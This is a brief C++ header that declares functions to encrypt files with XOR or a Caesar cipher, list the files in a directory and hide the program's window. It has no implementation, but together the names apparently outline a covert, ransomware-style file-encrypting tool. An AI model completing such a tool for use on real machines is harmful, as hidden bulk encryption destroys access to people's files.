#ifndef KK5V_H
#define KK5V_H

#include <string>
#include <vector>

void encryptFileXOR(const std::string& filePath);
void encryptFileCaesar(const std::string& filePath);
std::vector<std::string> getFilesInDirectory(const std::string& directory);
void hideWindow();

#endif // KK5V_H
